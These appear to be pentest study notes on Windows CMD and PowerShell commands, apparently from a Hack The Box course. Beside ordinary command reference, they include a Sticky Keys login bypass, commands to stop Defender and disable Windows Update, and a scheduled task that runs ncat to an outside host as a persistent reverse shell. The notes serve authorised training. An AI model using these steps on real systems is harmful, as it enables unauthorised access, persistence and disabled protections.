* ## Introduction
	* Two types of cml:
		* CMD.exe
			* 1981,
			* only batch commands,
			* no aliases,
			* command output cannot be passed to other commands,
			* output of commands is text,
			* command must finish before another command can run
			* does not have an Integrated Scripting Environment (ISE),
			* cannot access programming libraries,
			* only run on Windows
		* PowerShell
			* 2006,
			* runs both batch and PowerShell cmdlet commands,
			* has aliases,
			* cmdlet output can be passed to other cmdlets,
			* all output is in the form of an object, 
			* can execute a sequence of cmdlets in a script
			* has ISE
			* can access programming libraries because it is built on the .NET framework
			* can be run on Linux
* ## Command Prompt Basics
	* cmd.exe or CMD
	* based on COMMAND.COM interpreter in DOS
	* When PowerShell is locked down, we can use CMD to elevate privileges
	* **Local Access** vs. **Remote Access**
		* Local access is having direct physical access to the machine
		* Remote access is RDP, telnet, SSH, PSExec, WinRM, or other protocols.
	* `dir`
	* Booting from a Windows installation disc gives us the option to boot to `Repair Mode`.
		* From here, the user is provided access to a Command Prompt, allowing for command-line-based troubleshooting of the device.
		* **potential risk** - use the recovery Command Prompt to tamper with the filesystem. Specifically, replacing the `Sticky Keys` (`sethc.exe`) binary with another copy of `cmd.exe`
			* Once the machine is rebooted, we can press `Shift` five times on the Windows login screen to invoke `Sticky Keys`. Since the executable has been overwritten, what we get instead is another Command Prompt - this time with `NT AUTHORITY\SYSTEM` permissions. We have bypassed any authentication and now have access to the machine as the super user.
	* `where cmd.exe` to find location of executable in CMD
* ## Getting Help (cmd)
	* `help`
	* `help <command name>` e.g. `help time`
		* This will work for any system command built-in but not for every command accessible on the system.
		* Certain commands do not have a help page associated with them. For example, running `help ipconfig` will give us the following output.
			* `This command is not supported by the help utility. Try "ipconfig /?"`
	* [Microsoft Documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)
	* [ss64](https://ss64.com/nt/) Is a handy quick reference
	* **Tips & Tricks**
		* `cls` to clear screen
		* `doskey history` to see command history (also page up and down with arrow keys)
			* doskey /history - doskey /history will print the session's command history to the terminal or output it to a file when specified.
			* page up - Places the first command in our session history to the prompt.
			* page down - Places the last command in history to the prompt.
			* ⇧ - Allows us to scroll up through our command history to view previously run commands.
			* ⇩ - Allows us to scroll down to our most recent commands run.
			* ⇨ - Types the previous command to prompt one character at a time.
			* ⇦ - N/A
			* F3 - Will retype the entire previous entry to our prompt.
			* F5 - Pressing F5 multiple times will allow you to cycle through previous commands.
			* F7 - Opens an interactive list of previous commands.
			* F9 -Enters a command to our prompt based on the number specified. The number corresponds to the commands place in our history.
		* unlike Bash or other shells, CMD does not keep a persistent record of the commands you issue through sessions.
			* Once you close that instance, that history is gone.
			* To save a copy of our issued commands, we can use `doskey` again to output the history to a file, show it on screen, and then copy it.
		* `ctrl + c` exits a running process
* ## System Navigation (cmd)
	* `dir` list directory
	* `cd` change directory to another directory OR print working directory if no arguments given
		* `cd`
		* `chdir` same as `cd`
		* **Absolute paths** vs **Relative paths**
			* Absolute
				* `cd C:\Users\htb\Pictures`
			* Relative
				* `cd .\Pictures`
			* both go to same place, `C:\Users\htb\Pictures`
		* `cd ..\..\..\` moves us from `C:\Users\htb\Pictures` to `C:\`
		* `cd ..`
	* `tree` list directories in tree
		* `tree /F` lists each file and directories along with the directory tree of the path
	* **Interesting Directories**
		* %SYSTEMROOT%\Temp - `C:\Windows\Temp` - Global directory containing temporary system files accessible to all users on the system. All users, regardless of authority, are provided full read, write, and execute permissions in this directory. **Useful for dropping files as a low-privilege user on the system.**
		* %TEMP% - `C:\Users\<user>\AppData\Local\Temp` - Local directory containing a user's temporary files accessible only to the user account that it is attached to. Provides full ownership to the user that owns this folder. **Useful when the attacker gains control of a local/domain joined user account.**
		* %PUBLIC% - `C:\Users\Public` - Publicly accessible directory allowing any interactive logon account full access to read, write, modify, execute, etc., files and subfolders within the directory. **Alternative to the global Windows Temp Directory as it's less likely to be monitored for suspicious activity.**
		* %ProgramFiles% - `C:\Program Files` - folder containing all 64-bit applications installed on the system. **Useful for seeing what kind of applications are installed on the target system.**
		* %ProgramFiles(x86)% - `C:\Program Files (x86)` - Folder containing all 32-bit applications installed on the system. **Useful for seeing what kind of applications are installed on the target system.**
		* and more but these are likely targeted as they are useful to attackers
* ## Working with Directories and Files (cmd)
	* `dir`
	* `tree`
		* `tree /F`
	* **Create a New Directory**
		* `md` - make directory
			* `md new-directory` creates folder named "new-directory"
		* `mkdir` - make directory
			* `mkdir yet-another-dir` creates a folder named "yet-another-dir"
	* **Delete Directories**
		* `rd` - remove directory
			* `rd Git-Pulls` - remove folder "Git-Pulls", fails without `/S` switch because folder has contents
				* `rd /S Git_Pulls` - removes folder and its files
		* `rmdir` - remove directory
			* same as `rd` commands
	* **Modifying**
		* `move` - move directory to a path
			* `move example C:\Users\htb\Documents\example`
		* `xcopy` - copy directory and files, deprecated for `robocopy`. Xcopy is good for removing the Read-only bit from files when moving them.
			* syntax is `xcopy source destination options`
			* `xcopy C:\Users\htb\Documents\example C\Users\htb\Desktop\ /E`
				* `/E` option tells xcopy to copy any files and subdirectories to include empty directories.
				* `/K` option will retain the file's attributes, by default, xcopy will not delete the source directory and will reset any attributes the file had.
			* From a hacker's perspective, xcopy can be extremely helpful. If we wish to move a file, even a system file, or something locked, xcopy can do this without adding other tools to the host. As a defender, this is a great way to grab a copy of a file and retain the same state for analysis. For example, you wish to grab a read-only file that was transferred in from a CD or flash drive, and you now suspect it of performing suspicious actions.
		* `robocopy` - copy directory and files, made for large directories and drive syncing. Not good for copying singular files or directories
			* `robocopy C:\Users\htb\Desktop C:\Users\htb\Documents\`
			* can also work with system, read-only, and hidden files
			* to work around restrictions (like if we do not have the `SeBackupPrivilege` and `auditing privilege` attributes), we can use the `/MIR` switch (mirror) to permit ourselves to copy the files we need temporarily
				* `robocopy /E /B /L C:\Users\htb\Desktop\example C:\Users\htb\Documents\Backup\`
				* It will mark the files as a system backup and hide them from view.
				* to clear additional attributes, add the `/A-:SH` switch to our command.
					* `/MIR` mirrors the destination directory to the source. Any file that exists within the destination will be removed.
					* so place the new copy in a clear folder.
					* `/L` switch is a what-if command, processes the command you issue but does not execute. shows potential results.
					* `robocopy /E /MIR /a-:SH C:\Users\htb\Desktop\notes\ C:\Users\htb\Documents\Backup\Files-to-exfil\`
	* **Files**
		* `dir` - shows files in directories
		* `tree /F` - also shows files in directories
		* `more` - view contents of a file one screen at a time, use ENTER or SPACE to go to next page
			* `more secrets.txt`
			* `/S` option crunch blank space down to a single line at each point to make it easier to view. This does not modify the file
				* `more /S secrets.txt`
			* Send a command output to `more`
				* `ipconfig /all | more`
				* allows us to view the data by page and not scroll through terminal
		* `openfiles` - see what file on our local pc or a remote host has open and from which user.
			* can view, disconnect open files, kick users from accessing specific files.
			* Not enabled by default on Windows
		* `type` - display the contents of multiple text files at once
			* also possible to utilize fire redirection with `type`
			* will NOT lock files
			* `type bio.txt`
			* To redirect output
				* `type passwords.txt >> secrets.txt`
				* appends to secrets.txt
		* **Create and Modify a Files**
			* `echo` - output redirection, modify a file or create a new one
				* `echo Check out this text > demo.txt`
			* `fsutil` - can create a file
				* `fsutil file createNew for-sure.txt 222`
			* `ren` - allows us to change the name of a file to something new (rename)
				* `ren demo.txt superdemo.txt`
		* **Input / Output**
			* `>`, `<`, `|`, and `&`
				* `>` output to a file, can create a file too if it doesn't exist, or overwrites existing file
				* `>>` append output to a file
				* `<` feeds input from a command out before, can be used to search for keywords, etc.
				* `|` pipes output between commands, two commands chained/connected, different from `&` succession
					* `||` the opposite of `&&`, runs first command, if it fails, runs the second command, if it succeeds it stops.
				* `&` two commands in succession, runs 1st then 2nd, then next and so on
					* `&&` runs first command and if it succeeds runs 2nd. Stops if 1st command fails
		* **Deleting Files**
			* `del` - delete a file
			* `erase` - delete multiple files
			* `/A:` switch deletes files of a specific attribute
				* `dir /A:R` shows files that are read-only
				* `del /A:R *` deletes files that is read-only
					* `*` specifies any file that matches attributes
				* `dir /A:H` shows hidden files
				* `del /A:H *` deletes hidden files
		* **Copying and Moving Files**
			* `copy` - copies file and closes
				* `copy secrets.txt C:\Users\student\Downloads\not-secrets.txt`
				* `/V` switch will turn on file validation to confirm the copy was successful
			* `move` - moves files and directories to another place and can rename them
				* `move C:\Users\student\Desktop\bio.txt C:\Users\student\Downloads`
* ## Gathering System Information (cmd)
	* aka **host enumeration** - to provide an overall picture of the target host, its environment, and how it interacts with other systems across the network.
	* **Types of Information We Can Gather from the System**
		* How do we know what to look for?
			* First, understand types of information:
			* ![[Pasted image 20231103113446.png]]
				General System Information
				Networking Information
				Basic Domain Information
				Hostname
				OS Name
				OS Version
				OS Information
				OS Configuration
				Installed Patched/Hotfixes
				Host IP Address
				Available Network Interfaces
				Accessible Subnets
				DNS Server(s)
				Known Hosts
				Network Resources
				Network Shares
				Domain Resources
				Network Devices (Printers, etc.)
				Host Firewall Configuration
				Domain/Workgroup Name
				Logon Server
				User Accounts
				Local Groups
				Environment Variables
				User Information
				Currently Running on Host
				Available Tasks
				Scheduled Tasks
				Known Anti Virus Solutions
				Available Services
				IDS/IPS Solutions
		* **`General System Information`** - Contains information about the overall target system. Target system information includes but is not limited to the `hostname` of the machine, OS-specific details (`name`, `version`, `configuration`, etc.), and `installed hotfixes/patches` for the system.
		* **`Networking Information`** - Contains networking and connection information for the target system and system(s) to which the target is connected over the network. Examples of networking information include but are not limited to the following: `host IP address`, `available network interfaces`, `accessible subnets`, `DNS server(s)`, `known hosts`, and `network resources`.
		* **`Basic Domain Information`** - Contains Active Directory information regarding the domain to which the target system is connected.
		* **`User Information`** - Contains information regarding local users and groups on the target system. This can typically be expanded to contain anything accessible to these accounts, such as `environment variables`, `currently running tasks`, `scheduled tasks`, and `known services`.
		* Ask ourselves these questions during enumeration:
			* **What system information can we pull from our target host?**
			- **What other system(s) is our target host interacting with over the network?**
			- **What user account(s) do we have access to, and what information is accessible from the account(s)?**
	- **Why Do We Need This Information?** 
		- use the information gained from the target to provide us with a starting point and guide for how we wish to attack the system.
		- Questions we can ask to elevate access:
			**- What user account do we have access to?**
			**- What groups does our user belong to?**
			**- What current working set of privileges does our user have access to?**
			**- What resources can our user access over the network?**
			**- What tasks and services are running under our user account?**
	* **How Do We Get This Information?**
		* `systeminfo` - shows a lot but can be monitored 
		* `hostname` - hostname
		* `ver` - OS version
		* `ipconfig` - Domain Name, IPv4 Address, Subnet Mask, and Default Gateway
			* `ipconfig /all` - fully comprehensive listing (full TCP/IP configuration) of every network adapter attached to the system and additional information, including the physical address of each adapter (`MAC Address`), DHCP settings, and DNS Servers.
		* `arp /a` - Address Resolution protocol to quickly see what hosts our target has come into contact with
			* displays the contents and entries contained within the Address Resolution Protocol (`ARP`) cache. We can also use this command to modify the table entries effectively (in later modules).
		* `whoami` - current user, group, and privilege information
			* `whoami /priv`
			* *If the current user is not a domain-joined account, the `NetBIOS` name will be provided instead. The current `hostname` will be used in most cases.
			* `whoami /groups`
			* `whoami /all`
		* `net user` - Due to the nature of domain-joined networks, anyone can log in to any physical host on the network without requiring a local account on the machine. We can use this to our advantage by scoping out what users have accessed our current host to see if we could access other accounts.
		* `net group` - view all groups that exist from the domain, can also create, delete, add, or remove users from groups
		* `net localgroup` - view all groups that exist on our host, can also create, delete, add, or remove users from groups
		* `net share` - allows us to display info about shared resources on the host and to create new shared resources as well
			* For example, if we find a share named `Records` and its remarks are that it is a manually mounted share, that could contain some potentially interesting information for us to enumerate. Ideally, if we were to find an open share like this while on an engagement, we would need to keep track of the following:
				**- Do we have the proper permissions to access this share?**
				**- Can we read, write, and execute files on the share?**
				**- Is there any valuable data on the share?**
			* **In addition to providing information, `shares` are great for hosting anything we need and laterally moving across hosts as a pentester.**
				* persistence method and used to escalate privileges
		* `net view` - search the environment broadly, displays any shared resources the host you are issuing the command against knows of
* ## Finding Files and Directories (cmd)
	* `where` - gives us an idea of how to search for files and applications on the host
		* `where /R C:\Users\student\ bio.txt`
			* forces the `where` command to search through every folder in the student user directory hive
		* `where /R C:\Users\student\*.csv`
			* searches for the csv file type in the student directory.
		* ==`where.exe`
			* `where` wont work unless you add its `.exe` extension.
	* `find` - searches for text strings or their absence within a file or files. 
		* can also use `find` against the console's output or another command
		* `find "password" "C:\Users\student\not-passwords.txt"`
		* `/V` modifier can change our search from a matching clause to a `Not` clause.
			* So, for example, if we use `/V` with the search string password against a file, it will show us any line that does not have the specified string.
		* `/N` switch to display line numbers for us
		* `/I` display to ignore case sensitivity.
			* `find /N /I /V "IP Address" example.txt`
			* shows us any lines that do not match the string `IP Address` while also displaying line numbers and ignore the case of the string.
	* `findstr` - similar to `find` but for patterns instead. It will look for anything matching a pattern, regex value, wildcards, and more
		* basically `find`2.0
		* **similar to `grep` in Linux**
	* **Evaluating and Sorting Files**
		* `Comp` - compares each byte within two files looking for differences and then displays where they start (decimal format by default)
			* `comp .\file-1.md .\file-2.md`
			* `/A` modifier if we want to see the differences in ASCII format.
			* `/L` modifier can also provide us with the line numbers.
		* `fc` - differs from `Comp` because it will show you which lines are different, not just an individual character (`/A`) or byte that is different on each line.
			* has quite a few more options than `Comp` 
			* `fc.exe /?` - for HELP
			* `fc password.txt modded.txt /N`
				* Case-sensitive and cares more than just a byte-for-byte comparison.
				* `/N` modifier prints the line numbers and the ASCII comparison
		* `sort` - receive input from the console, pipeline, or a file, sort it and send the results to the console or into a file or another command.
			* `sort.exe .\file-1.md /O .\sort-1.md`
				* sorts `file-1.md` and sends the result with `/O` modifier to the file `sort-1.md`.
				* `/O` modifier sorts alphabetically
				* `/unique` modifier sorts only to return unique entries
					* `sort.exe .\sort-1.md /unique`
* ## Environment Variables (cmd)
	* these are settings that are often applied globally to our hosts.
		* Windows (not case sensitive and can have numbers and spaces in the name, cannot start with a number or include an equal sign), Linux, macOS
		* `%SUPER_IMPORTANT_VARIABLE%`
	* **Variable Scope**
		* a programming concept that refers to where variables can be accessed or referenced. Two catergories:
			* **Global** - accessible globally. In this context, the global scope lets us know that we can access and reference the data stored inside the variable from anywhere within a program.
				* ```C:\Users\alice> echo %WINDIR%

				C:\Windows```
				* ```C:\Users\bob> echo %WINDIR%
	
				C:\Windows```
			* **Local** - accessed within a local context. `Local` means that the data stored within these variables can only be accessed and referenced within the function or context in which it has been declared.
				* ```C:\Users\alice> set SECRET=HTB{5UP3r_53Cr37_V4r14813}

				C:\Users\alice> echo %SECRET%
				HTB{5UP3r_53Cr37_V4r14813}```

				* ```C:\Users\bob> echo %SECRET%
				%SECRET%

				C:\Users\bob> set %SECRET%
				Environment variable %SECRET% not defined```
	*  Windows, like any other program, contains its own set of variables known as `Environment Variables`. These variables can be separated into their defined scopes known as `System` and `User` scopes.
		* Additionally, there is one more defined scope known as the `Process` scope; however, it is volatile by nature and is considered to be a sub-scope of both the `System` and `User` scopes.
		* ![[Pasted image 20231106130929.png]]
	* **Using Set and Echo to View Variables**
		* `set` - print all available environment variables on the system. Alternatively, you can enter the same command again with the variable's name without setting it equal to anything to print the value of a specific variable
			* `set %SYSTEMROOT%`
		* `echo` - display the value of an environment variable, prints the value contained within the variable.
			* `echo %PATH%`
	* **Managing Environment Variables**
		* `set` - display, set, and remove environment variables
			* Only manipulates environment variables in the current command line session
		* `setx` - display, set, and remove environment variables
			* Make permanent changes to environment variables
	* **Creating Variables**
		* a variable to hold the value of the IP address of the Domain Controller (`DC`)
			* Using `set`
				* `set DCIP=172.16.5.2`
				* `echo %DCIP%`
				`172.16.5.2`
			* Using `setx`
				* `setx DCIP 172.16.5.2`
				* `echo %DCIP%`
				`172.16.5.2`
	* **Editing Variables**
		* Using `setx`
			* `setx DCIP 172.16.5.5`
			* `echo %DCIP%`
			`172.16.5.5`
	* **Removing Variables**
		* Using `setx`
			* `setx DCIP ""`
			* To verify
				* `set DCIP`
				`Environment variable DCIP not defined`
				* `echo %DCIP%`
				`%DCIP%`
	* **Important Environment Variables**
		* `%PATH%` - Specifies a set of directories(locations) where executable programs are located.
		* `%OS%` - The current operating system on the user's workstation.
		* `%SYSTEMROOT%` - Expands to `C:\Windows`. A system-defined read-only variable containing the Windows system folder. Anything Windows considers important to its core functionality is found here, including important data, core system binaries, and configuration files.
		* `%LOGONSERVER%` - Provides us with the login server for the currently active user followed by the machine's hostname. We can use this information to know if a machine is joined to a domain or workgroup.
		* `%USERPROFILE%` - Provides us with the location of the currently active user's home directory. Expands to `C:\Users\{username}`.
		* `%ProgramFiles%` - Equivalent of `C:\Program Files`. This location is where all the programs are installed on an `x64` based system.
		* `%ProgramFiles(x86)%` - Equivalent of `C:\Program Files (x86)`. This location is where all 32-bit programs running under `WOW64` are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (`x86` vs. `x64` architecture)
		* For a complete list, we can visit the following [link](https://ss64.com/nt/syntax-variables.html).
* ## Managing Services (cmd)
	* Perspectives of an attacker. We have just landed on a victims host and need to:
		- **Determine what services are running.
		- **Attempt to disable antivirus.**
		* **Modify existing services on a system.**
	* `sc` - Windows command line service controller utility. Allows us to query, modify, and manage host services locally and over the network.
		* Other tools that can query and manage services for local and remotes hosts include:
			* `WMIC`
			* `tasklist`
		* **Query Services**
			*  `query` services for information such as the `process state`, `process id` (`pid`), and `service type`
			* To see what services are currently actively running on the system:
				* `sc query type= service`
				* *Spacing after the equal sign is crucial as `type=service` and `type =service` will not work. Only `type= service` will work.
			* To query a the host and determine if Windows Defender is active:
				* `sc query windefend`
		* **Stopping and Starting Services**
			* Test permissions to stop Windows Defender
				* `sc stop windefend`
				* The only thing that can stop and start the Defender service is the [SYSTEM](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts#default-local-system-accounts) machine account.
				* *Blindly trying to stop services will fill the logs with errors and trigger any alerts showing that a user with insufficient privileges is trying to access a protected process on the system. 
			* Find the Print Spooler service
				* `sc query Spooler`
			* Stop the Print Spooler Service
				* `sc stop Spooler`
			* Start the Print Spooler Service
				* `sc start Spooler`
		* **Modifying Services**
			* e.g. disable at startup, modify service's path to the binary itself.
			* To configure services, we must use the [config](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config) parameter in `sc`. This will allow us to modify the values of existing services, regardless if they are currently running or not.
				* All changes made with this command are reflected in the Windows registry as well as the database for Service Control Manager (`SCM`). 
			* Let's try to take out Windows Updates for our current compromised host.
				* Windows updates rely on the following services:
					* `wuauserv` - Windows Update Service
					* `bits` - Background Intelligent Transfer Service
				* `sc query wuauserv`
				* `sc query bits`
				* `sc stop bits`
				* After ensuring that both services are currently stopped, we can modify the `start type` of both services. We can issue this change by performing the following:
				* `sc config wuauserv start= disabled`
				* `sc config bits start= disabled`
				* This change will persist upon reboot, meaning that when the system attempts to check for updates or update itself, it cannot do so because both services will remain disabled. We can verify that both services are indeed disabled by attempting to start them:
				* `sc start wuauserv`
				* `sc start bits`
				* To revert everything back to normal:
					* `sc config wuauserv start= auto`
					* `sc config bits start= auto`
	* `tasklist` - command line tool that gives us a list of currently running processes on a local or remote host.
		* `/svc` parameter provides a list of services running under each process on the system
		* `tasklist /svc`
	* `net start` - simply command that allows us to quickly list all current running services on a system. There is also `net stop`, `net pause`, and `net continue`. Behave similar to `sc`
		* `net start`
	* `WMIC` - Windows Management Instrumentation Command (WMIC) allows us to retrieve a vast range of information from our local host or host(s) across the network.
		* `wmic service list brief`
* ## Working With Scheduled Tasks (cmd)
	* ensure tasks run regularly
	* *Story Time: On several engagements, while pentesting an enterprise environment, I have been in a position where I landed on a host and needed a quick way to set persistence. Instead of doing anything crazy or pulling down another executable onto the host, I decided to search for or create a scheduled task that runs when a user logs in or the host reboots. In this scheduled task, I would set a trigger to open a new socket utilizing PowerShell, reaching out to my Command and Control infrastructure. This would ensure that I could get back in if I lost access to this host. If I were lucky, when the task I chose ran, I might also receive a SYSTEM-level shell back, elevating my privileges at the same time. It quickly ensured host access without setting off alarms with antivirus or data loss prevention systems.*
	* **Triggers That Can Kick Off a Scheduled Task:**
		- When a specific system event occurs.
		- At a specific time.
		- At a specific time on a daily schedule.
		- At a specific time on a weekly schedule.
		- At a specific time on a monthly schedule.
		- At a specific time on a monthly day-of-week schedule.
		- When the computer enters an idle state.
		- When the task is registered.
		- When the system is booted.
		- When a user logs on.
		- When a Terminal Server session changes state.
	- `schtasks` - schedule task command
		- Query Syntax:
			- `Query` - Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.
			- /fo - Sets formatting options. We can specify to show results in the `Table, List, or CSV` output.
			- /v - Sets verbosity to on, displaying the `advanced properties` set in displayed tasks when used with the List or CSV output parameter.
			- /nh - Simplifies the output using the Table or CSV output format. This switch `removes` the `column headers`.
			- /s - Sets the DNS name or IP address of the host we want to connect to. `Localhost` is the `default` specified. If `/s` is utilized, we are connecting to a remote host and must format it as "\\host".
			- /u - This switch will tell schtasks to run the following command with the `permission set` of the `user` specified.
			- /p - Sets the `password` in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The `u` and `p` values are only valid when used with the `s` parameter.
		- `SCHTASKS /Query /V /FO list`
		- Create a New Scheduled Task:
			- `Create` - Schedules a task to run.
			- /sc - Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.
			- /tn - Sets the name for the task we are building. Each task must have a unique name.
			- /tr - Sets the trigger and task that should be run. This can be an executable, script, or batch file.
			- /s - Specify the host to run on, much like in Query.
			- /u - Specifies the local user or domain user to utilize
			- /p - Sets the Password of the user-specified.
			- /mo - Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day.
			- /rl - Allows us to limit the privileges of the task. Options here are `limited` access and `Highest`. Limited is the default value.
			- /z - Will set the task to be deleted after completion of its actions.
			- At a minimum, we must specify the following:
				- `/create` : to tell it what we are doing
				- `/sc` : we must set a schedule
				- `/tn` : we must set the name
				- `/tr` : we must give it an action to take
		- `schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"`
		- *A great example of a use for schtasks would be providing us with a callback every time the host boots up. This would ensure that if our shell dies, we will get a callback from the host the next time a reboot occurs, making it likely that we will only lose access to the host for a short time if something happens or the host is shut down.==We can create or modify a new task by adding a new trigger and action. In our task above, we have schtasks execute Ncat locally, which we placed in the user's AppData directory, and connect to the host `172.16.1.100` on port `8100`.== If successfully executed, this connection request should connect to our command and control framework (Metasploit, Empire, etc.) and give us shell access.*
		- Change the Properties of a Scheduled Task:
			- `Change` - Allows for modifying existing scheduled tasks.
			- /tn - Designates the task to change
			- /tr - Modifies the program or action that the task runs.
			- /ENABLE - Change the state of the task to Enabled.
			- /DISABLE - Change the state of the task to Disabled.
			- Say we found the `hash` of the local admin password and want to use it to spawn our Ncat shell for us; if anything happens, we can modify the task like so to add in the credentials for it to use:
				- `schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"`
			- Now to make sure our changes took, we can query for the specific task using the `/tn` parameter and see:
				- `schtasks /query /tn "My Secret Task" /V /fo list `
			- If we want to ensure it works, we can use the `/run` parameter to kick the task off immediately.
		* To manually run 
			* `schtasks /run /tn "My Secret Task"`
		- Delete the Scheduled Task(s)
			- `Delete` - Remove a task from the schedule
			- /tn - Identifies the task to delete.
			- /s - Specifies the name or IP address to delete the task from.
			- /u - Specifies the user to run the task as.
			- /p - Specifies the password to run the task as.
			- /f - Stops the confirmation warning.
			- `schtasks /delete  /tn "My Secret Task" `
- ## CMD Vs. PowerShell (PowerShell)
	- PowerShell is cmd successor
	- see [[Windows Fundamentals]] for notes
	- PowerShell is a cli **AND** a scripting language
		- uses .NET framework, allowing an object base model of interaction and output
		- cmdlets are in syntax form verb-noun (`Get-ChildItem`)
		- Using PowerShell to automate tasks like:
			- Provisioning servers and installing server roles
			- Creating Active Directory user accounts for new employees
			- Managing Active Directory group permissions
			- Disabling and deleting Active Directory user accounts
			- Managing file share permissions
			- Interacting with [Azure](https://azure.microsoft.com/en-us/) AD and Azure VMs
			- Creating, deleting, and monitoring directories & files
			- Gathering information about workstations and servers
			- Setting up Microsoft Exchange email inboxes for users (in the cloud &/or on-premises)
		- As a pentester, many well-known capabilities are built into PowerShell.
			- PowerShell's module import capability makes it easy to bring our tools into the environment and ensure they will work. However, from a stealth perspective, PowerShell's `logging` and `history` capability is powerful and will log more of our interactions with the host. **So if we do not need PowerShell's capabilities and wish to be more stealthy, we should utilize CMD.**
		- **To call PowerShell**
			- Windows Search
				- Select PowerShell
			- Windows Terminal
				- change from cmd to PowerShell
			- Windows PowerShell ISE
				- easier to develop, debug, and test PowerShell scripts
			- Using PowerShell in CMD
				- `powershell.exe`
		- **To get help**
			- `Get-Help Test-Wsman`
				- Get-Help cmdlet before the command
			- `Get-Help Test-Wsman -online`
				- opens help page on browser
		- **To update help**
			- `Update-Help`
		- **To print current working directory**(Linux `pwd`)
			- `Get-Location`
		- **To list the directory** (Linux `ls`)
			- `Get-ChildItem`
		- **To move to a new directory** (Linux `cd`)
			- `Set-Location .\Documents\`
			- OR
			- `Set-Location C:\Users\DLarusso\Documents`
		- **To display contents of a file** (Linux `cat`, `less`, `head`, `tail`)
			- `Get-Content Readme.md`
		- **To find a command you cant remember**
			- `Get-Command`
				- Lists cmdlets
			- `Get-Command -verb get`
				- List cmdlets that verb is `get`
			- `Get-Command -noun windows*`
				- List cmdlets that noun starts with `windows`
				- `*` is recognized as a wildcard
		- **To get history of commands** (Linux `history`)
			- `Get-History`
			- can recall commands in history using alias `r` and the ID # 
				- `r 14`
			- History deletes when current session is closed
			- `PSReadLine` stores everything in a file called `$($host.Name)_history.txt` located at `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine`
		* **To view PSReadLine History**
			* `get-content C:\Users\DLarusso\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
			* One great feature of `PSReadline` from an admin perspective is that it will automatically attempt to filter any entries that include the strings:
				- `password`
				- `asplaintext`
				- `token`
				- `apikey`
				- `secret`
		- **To clear screen** (Linux `clear`)
			- `Clear-Host`
			- also can use `clear` or `cls`
		- **Hotkeys**:
			- `CTRL+R` - It makes for a searchable history. We can start typing after, and it will show us results that match previous commands.
			- `CTRL+L` - Quick screen clear
			- `CTRL+ALT+Shift+?` - This will print the entire list of keyboard shortcuts PowerShell will recognize.
			- `Escape` - When typing into the CLI, if you wish to clear the entire line, instead of holding backspace, you can just hit `escape`, which will erase the line.
			- `↑` - Scroll up through our previous history.
			- `↓` - Scroll down through our previous history.
			- `F7` - Brings up a TUI with a scrollable interactive history from our session.
		- **To use tab completion**
			- tab
			- SHIFT+TAB
		- **To get a list of Alias**
			- `Get-Alias`
			- shorter names of commands, saves time
			- the alias for `Get-Alias` is `gal`
		- **To set an Alias for a specific cmdlet**
			- `Set-Alias -Name gh -Value Get-Help`
	- **Helpful Aliases**
		- `pwd` - gl can also be used. This alias can be used in place of Get-Location.
		- `ls` - dir and gci can also be used in place of ls. This is an alias for Get-ChildItem.
		- `cd` - sl and chdir can be used in place of cd. This is an alias for Set-Location.
		- `cat` - type and gc can also be used. This is an alias for Get-Content.
		- `clear` - Can be used in place of Clear-Host.
		- `curl` - Curl is an alias for Invoke-WebRequest, which can be used to download files. wget can also be used.
		- `fl and ft` - These aliases can be used to format output into list and table outputs.
		- `man` - Can be used in place of help.
- ## All About Cmdlets and Modules (PowerShell)
	- **cmdlet** - a single-feature command that manipulates objects in PowerShell.
		- Verb-Noun structure
		- cmdlets are not written in PowerShell, they are written in C# or another language and then compiled for use.
	- **PowerShell module** - structured PowerShell code that is made easy to use & share. Can be made up of the following:
		- Cmdlets
		- Script files
		- Functions
		- Assemblies
		- Related resources (manifests and help files)
	- **PowerView.ps1** - part of a collection of PowerShell modules organized in a project called PowerSploit created by the PowerShellMafia to provide penetration testers with many valuable tools to use when testing Windows Domain/Active Directory environments.
		- The use of PowerSploit to Enumerate & Attack Windows Domain environments is covered in great depth in the module [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks).
		- **PowerSploit.psd1** - a PowerShell data file (`.psd1`) is a [Module manifest file](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_module_manifests?view=powershell-7.2). Contained in a manifest file we can often find:
			- Reference to the module that will be processed
			- Version numbers to keep track of major changes
			- The GUID
			- The Author of the module
			- Copyright
			- PowerShell compatibility information
			- Modules & cmdlets included
			- Metadata
		- **PowerSploit.psm1** - a PowerShell script module file (`.psm1`) is simply a script containing PowerShell code.
			- To get contents of PowerSploit.psm1
				- `Get-ChildItem $PSScriptRoot | ? { $_.PSIsContainer -and !('Tests','docs' -contains $_.Name) } | % { Import-Module $_.FullName -DisableNameChecking }`
				- The Get-ChildItem cmdlet gets the items in the current directory (represented by the $PSScriptRoot automatic variable), and the Where-Object cmdlet (aliased as the "?" character) filters those down to only the items that are folders and do not have the names "Tests" or "docs". Finally, the ForEach-Object cmdlet (aliased as the "%" character) executes the Import-Module cmdlet against each of those remaining items, passing the DisableNameChecking parameter to prevent errors if the module contains cmdlets or functions with the same names as cmdlets or functions in the current session.
			- Use **Get-Module** to show modules already loaded
				- `Get-Module`
			- Use **List-Available** to show all modules we have installed but not loaded into our session
				- `Get-Module -ListAvailable`
			- Use **Import-Module** to add a module to the current PowerShell session
				- `Get-Help Import-Module` to see help page
				- To understand the idea of importing the module into our current PowerShell session, we can attempt to run a cmdlet (`Get-NetLocalgroup`) that is part of PowerSploit. We will get an error message when attempting to do this without importing a module. Once we successfully import the PowerSploit module (it has been placed on the target host's Desktop for our use), many cmdlets will be available to us, including Get-NetLocalgroup:
					- `Import-Module .\PowerSploit.psd1`
					- `Get-NetLocalgroup`
					- Notice how at the beginning of the clip, `Get-NetLocalgroup` was not recognized. This event happened because it is not included in the default module path. We see where the default module path is by listing the environment variable `PSModulePath`.
